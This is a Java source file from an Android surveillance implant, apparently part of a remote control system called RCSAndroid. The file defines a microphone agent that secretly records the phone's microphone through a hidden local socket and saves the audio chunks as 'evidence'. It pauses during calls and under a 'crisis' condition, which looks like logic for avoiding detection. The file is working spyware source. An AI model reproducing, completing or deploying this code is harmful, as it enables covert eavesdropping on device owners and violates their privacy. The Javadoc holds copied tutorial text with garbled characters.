/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import java.io.IOException;
import java.io.InputStream;

import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.util.Log;

import com.ht.RCSAndroidGUI.Call;
import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.StateRun;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.agent.call.PhoneListener;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerCall;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent. 8000KHz, 32bit
 * 
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 *       Recipe: Recording Audio Files Recording audio using MediaRecorder is
 *       similar to playback from the previous recipe, except a few more things
 *       need to be specified (note, DEFAULT can also be used and is the same as
 *       the first choice in these lists): n MediaRecorder.AudioSource: n
 *       MICÑBuilt-in microphone n VOICE_UPLINKÑTransmitted audio during voice
 *       call n VOICE_DOWNLINKÑReceived audio during voice call n
 *       VOICE_CALLÑBoth uplink and downlink audio during voice call n
 *       CAMCORDERÑMicrophone associated with camera if available n
 *       VOICE_RECOGNITIONÑMicrophone tuned for voice recognition if available n
 *       MediaRecorder.OutputFormat: n THREE_GPPÑ3GPP media file format n
 *       MPEG_4ÑMPEG4 media file format n AMR_NBÑAdaptive multirate narrowband
 *       file format Audio 157 158 Chapter 6 Multimedia Techniques n
 *       MediaRecorder.AudioEncoder: n AMR_NBÑAdaptive multirate narrowband
 *       vocoder The steps to record audio are 1. Create an instance of the
 *       MediaRecorder: MediaRecorder m_Recorder = new MediaRecorder(); 2.
 *       Specify the source of media, for example the microphone:
 *       m_Recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 3. Set the
 *       output file format and encoding, such as:
 *       m_Recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 *       m_Recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); 4. Set
 *       the path for the file to be saved: m_Recorder.setOutputFile(path); 5.
 *       Prepare and start the recording: m_Recorder.prepare();
 *       m_Recorder.start(); These steps for audio recording can be used just as
 *       they were in the previous recipe for playback.
 * @author zeno
 */
public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListener, OnInfoListener {

	private static final long MIC_PERIOD = 5000;
	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };

	private static final String TAG = "AgentMic";

	/** The recorder. */
	MediaRecorder recorder;

	// Object stateLock = new Object();

	private int numFailures;
	private long fId;

	private LocalSocket receiver;
	private LocalServerSocket lss;
	private LocalSocket sender;
	private InputStream is;
	private String socketname;

	boolean phoneListening;
	private boolean resuming;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		try {

			Check.requires(status == StateRun.STARTING, "inconsistent status");

			addPhoneListener();

			// recorder = new MediaRecorder();

			startRecorder();
			Log.d("QZ", TAG + "started");

		} catch (IllegalStateException e) {
			e.printStackTrace();
			Log.d("QZ", TAG + " (begin) Error: " + e.toString());
		} catch (IOException e) {
			e.printStackTrace();
			Log.d("QZ", TAG + " (begin) Error: " + e.toString());
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {
		Log.d("QZ", TAG + " (end)");
		Check.requires(status == StateRun.STOPPING, "state not STOPPING");

		removePhoneListener();

		saveRecorderEvidence();
		stopRecorder();

		Log.d("QZ", TAG + " (ended)");

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		Check.requires(status == StateRun.STARTED, "inconsistent status");

		int amp = recorder.getMaxAmplitude();
		if (amp != 0) {
			Log.d("QZ", TAG + " (go): max amplitude=" + amp);
		}

		if (numFailures < 10) {
			saveRecorderEvidence();

		} else {
			Log.d("QZ", TAG + "numFailures: " + numFailures);
			stopThread();
		}

		if (Status.self().crisisMic()) {
			Log.d("QZ", TAG + "crisis!");
			suspend();
		}

	}

	private void addPhoneListener() {
		if (!phoneListening) {
			ListenerCall.self().attach(this);
			phoneListening = true;
		}
	}

	private void removePhoneListener() {
		if (phoneListening) {
			ListenerCall.self().detach(this);
			phoneListening = false;
		}
	}

	private void saveRecorderEvidence() {

		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");

		final byte[] chunk = getAvailable();

		if (chunk != null && chunk.length > 0) {

			int offset = 0;
			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				offset = AMR_HEADER.length;
			}

			byte[] data;
			if (offset == 0) {
				data = chunk;
			} else {
				data = Utils.copy(chunk, offset, chunk.length - offset);
			}

			new LogR(EvidenceType.MIC, getAdditionalData(), data);

		} else {
			Log.d("QZ", TAG + "zero chunk ");
			numFailures += 1;
		}
	}

	private byte[] getAvailable() {
		byte[] ret = null;
		try {
			if (receiver.isBound() && receiver.isConnected()) {
				if (is == null) {
					is = receiver.getInputStream();
				}

				int available = is.available();
				ret = new byte[available];
				is.read(ret);
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.d("QZ", TAG + " (getAvailable) Error: " + e);
		}

		return ret;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		byte[] confParameters = conf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);

		try {
			int vad = databuffer.readInt();
			int value = databuffer.readInt();
		} catch (IOException e) {
			return false;
		}
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	private void restartRecorder() {
		try {
			stopRecorder();
			startRecorder();
		} catch (IllegalStateException e) {
			Log.d("QZ", TAG + " (restartRecorder) Error: " + e);
			e.printStackTrace();
		} catch (IOException e) {
			Log.d("QZ", TAG + " (restartRecorder) Error: " + e);
			e.printStackTrace();
		}
	}

	/**
	 * Start recorder.
	 * 
	 * @throws IllegalStateException
	 *             the illegal state exception
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	private synchronized void startRecorder() throws IllegalStateException, IOException {
		Log.d("QZ", TAG + " (startRecorder)");
		numFailures = 0;

		final DateTime dateTime = new DateTime();
		fId = dateTime.getFiledate();

		createSockets();
		recorder = new MediaRecorder();
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

		recorder.setOutputFile(sender.getFileDescriptor());

		recorder.prepare();
		recorder.start(); // Recording is now started

	}

	private void createSockets() {
		receiver = new LocalSocket();
		try {
			socketname = Long.toHexString(Utils.getRandom());
			lss = new LocalServerSocket(socketname);
			receiver.connect(new LocalSocketAddress(socketname));
			receiver.setReceiveBufferSize(500000);
			receiver.setSendBufferSize(500000);
			sender = lss.accept();
			sender.setReceiveBufferSize(500000);
			sender.setSendBufferSize(500000);
		} catch (IOException e) {
			Log.d("QZ", TAG + " (createSockets) Error: " + e);
		}
	}

	private void deleteSockets() {
		try {
			is.close();
			is=null;
			sender.close();
			receiver.close();
			lss.close();
		} catch (IOException e) {
			e.printStackTrace();
			Log.d("QZ", TAG + " (deleteSockets) Error: " + e);
		}
	}

	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java
	/**
	 * Stop recorder.
	 */
	private synchronized void stopRecorder() {
		Check.requires(recorder == null, "null recorder");

		Log.d("QZ", TAG + " (stopRecorder)");

		recorder.setOnErrorListener(null);
		recorder.setOnInfoListener(null);
        
		recorder.stop();
		recorder.reset(); // You can reuse the object by going back to
							// setAudioSource() step
		// recorder.release(); // Now the object cannot be reused
		getAvailable();
		deleteSockets();

		recorder.release();
		recorder = null;

	}

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;

		final int tlen = 16;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		Check.ensures(additionalData.length == tlen, "Wrong additional data name");

		return additionalData;
	}

	public int notification(Call call) {
		if (call.isOngoing()) {
			Log.d("QZ", TAG + " (notification): call incoming, suspend");
			suspend();
		} else {
			Log.d("QZ", TAG + " (notification): ");
			resume();
		}

		return 1;
	}

	@Override
	public void suspend() {
		if (!isSuspended()) {
			super.suspend();
			saveRecorderEvidence();
			stopRecorder();
			Log.d("QZ", TAG + " (suspended)");
		}
	}

	@Override
	public void resume() {
		if (isSuspended()) {
			try {
				startRecorder();
			} catch (IllegalStateException e) {
				Log.d("QZ", TAG + " (resume) Error: " + e);
			} catch (IOException e) {
				Log.d("QZ", TAG + " (resume) Error: " + e);
			}

			super.resume();
			Log.d("QZ", TAG + " (resumed)");
		}

	}

	public void onInfo(MediaRecorder mr, int what, int extra) {
		Log.d("QZ", TAG + " (onInfo): " + what);
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		Log.d("QZ", TAG + " (onError) Error: " + what);
	}
}
